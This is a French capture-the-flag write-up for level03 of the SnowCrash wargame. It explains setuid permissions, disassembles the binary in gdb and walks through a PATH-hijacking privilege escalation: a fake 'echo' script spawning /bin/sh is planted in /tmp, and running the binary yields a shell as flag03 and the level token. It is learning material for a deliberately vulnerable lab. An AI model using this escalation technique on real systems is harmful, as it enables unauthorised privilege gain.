# LEVEL03

Le systeme de fichier se présente de cette manière:

```
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

Le fichier ```level03``` est un programme.

Le ```s``` dans ```rws``` remplace le ```x``` pour signifier que le programme est ```setuid```, il stock l'ID du propriétaire du fichier, ici ```flag03``` et pas seulement celui de l'utilisateur qui le lance.

avec ```x``` le programme est lancé avec:

```bash
RUID = level03 # ID réel, celui de l'utilisteur qui lance le programme
EUID = level03 # ID effectif
```
Alors qu'avec ```s```:

```bash
RUID = level03
EUID = flag03 # on stock l'ID du propriétaire du fichier dans EUID
```

Pour le ```r-s``` côté groupe, le programme s'exécute avec les droits du groupe propiétaire du fichier.

En tentant de l'exécuter on obtient cette phrase:

```
level03@SnowCrash:~$ ./level03 
Exploit me
```

On comprend que l'on va devoir utiliser des outils pour l'analyser.

En utilisant gdb on en conclu que l'on est face à un programme en ```C```.

```Diff
level03@SnowCrash:~$ gdb ./level03
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
...
Reading symbols from /home/user/level03/level03...done.
(gdb) b main
+Breakpoint 1 at 0x80484ad: file /home/user/level03/level03.c, line 11.
```

On peut obtenir des informations sur l'exécutable de différentes manières.

En utilisant les commandes ```strings``` ou ```nm``` ou en regardant le code assembleur via ```GDB``` comme ci-dessous:

```c
0x80484a4 <main>        push   ebp                                                                                 
0x80484a5 <main+1>      mov    ebp,esp                                                                             
0x80484a7 <main+3>      and    esp,0xfffffff0                                                                      
0x80484aa <main+6>      sub    esp,0x20                                                                            
0x80484ad <main+9>      call   0x80483a0 <getegid@plt>                                                             
0x80484b2 <main+14>     mov    DWORD PTR [esp+0x18],eax                                                            
0x80484b6 <main+18>     call   0x8048390 <geteuid@plt>                                                             
0x80484bb <main+23>     mov    DWORD PTR [esp+0x1c],eax                                                            
0x80484bf <main+27>     mov    eax,DWORD PTR [esp+0x18]                                                            
0x80484c3 <main+31>     mov    DWORD PTR [esp+0x8],eax                                                             
0x80484c7 <main+35>     mov    eax,DWORD PTR [esp+0x18]                                                            
0x80484cb <main+39>     mov    DWORD PTR [esp+0x4],eax                                                             
0x80484cf <main+43>     mov    eax,DWORD PTR [esp+0x18]                                                            
0x80484d3 <main+47>     mov    DWORD PTR [esp],eax                                                                 
0x80484d6 <main+50>     call   0x80483e0 <setresgid@plt>                                                           
0x80484db <main+55>     mov    eax,DWORD PTR [esp+0x1c]                                                            
0x80484df <main+59>     mov    DWORD PTR [esp+0x8],eax                                                             
0x80484e3 <main+63>     mov    eax,DWORD PTR [esp+0x1c]                                                            
0x80484e7 <main+67>     mov    DWORD PTR [esp+0x4],eax                                                             
0x80484eb <main+71>     mov    eax,DWORD PTR [esp+0x1c]                                                            
0x80484ef <main+75>     mov    DWORD PTR [esp],eax                                                                 
0x80484f2 <main+78>     call   0x8048380 <setresuid@plt>                                                           
0x80484f7 <main+83>     mov    DWORD PTR [esp],0x80485e0                                                           
0x80484fe <main+90>     call   0x80483b0 <system@plt>                                                              
0x8048503 <main+95>     leave                                                                                      
0x8048504 <main+96>     ret 
```

Le plus intéressant ici ce sont les instructions ```call``` qui nous indiquent que le programme appelle des fonctions et notamment:

```getegid``` et ```geteuid``` qui permettent de recuperer les ```ID effectifs``` de group et user (ici ```flag03```).

```setresgid``` et ```setresuid``` qui permettent de set les ID de group et user du programme lui-même.

```system``` qui permet de lancer un programme présent dans le système.

pour résumer le programme, grâce aux fonctions ```get``` on récupère l'ID du user ```flag03``` et avec les fonctions ```set``` on a remplacé les ID du programme lui-même par celui de ```flag03```.

Donc juste avant de lancer la fonction ```system``` on a:

```bash
RUID = flag03
EUID = flag03
```

Ce qui veut dire que l'on va pouvoir, via ```system```, lancer un nouveau programme mais avec les droits du user ```flag03```.


On remarque aussi à l'adresse ```$0x80485e0```, une string intéressante:

``` bash
(gdb) x/s 0x80485e0
0x80485e0:	 "/usr/bin/env echo Exploit me"
```

Il s'agit du programme lancé par la fonction ```system```.

Le programme n'appelle pas ```bin/echo``` mais la commande ```echo``` via ```env```. Le chemin est trouvé avec la variable ```PATH``` de l'env. 
En modifiant la variable PATH de l'env on peut donc rediriger ```system``` vers un "faux" programme echo.

On creer un fichier echo dans ```/tmp``` et on lui donne tous les droits d'exécution.
Ce fichier est un simple script qui lance un ```subshell```.

``` shell
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:/tmp$ echo "/bin/sh" > echo
level03@SnowCrash:/tmp$ chmod +x echo

```

On change le PATH dans l'env pour indiquer un nouveau chemin pour notre faux ```echo```, à savoir qu'on ajoute le chemin ```/tmp```.

```Diff
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
level03@SnowCrash:/tmp$ export
...
+declare -x PATH="/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
declare -x PWD="/tmp"
declare -x SHELL="/bin/bash"
...
declare -x temp
```

Puis on exécute le script ```level03```. La fonction ```system``` lance notre programme echo et dans le subshell on peut alors exécuter la commande ```getflag``` mais avec les droits de ```flag03```, nous permettant ainsi de récuperer le mot de passe:

```Diff
level03@SnowCrash:/tmp$ cd
level03@SnowCrash:~$ ./level03
$ whoami
flag03
$ getflag
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

```
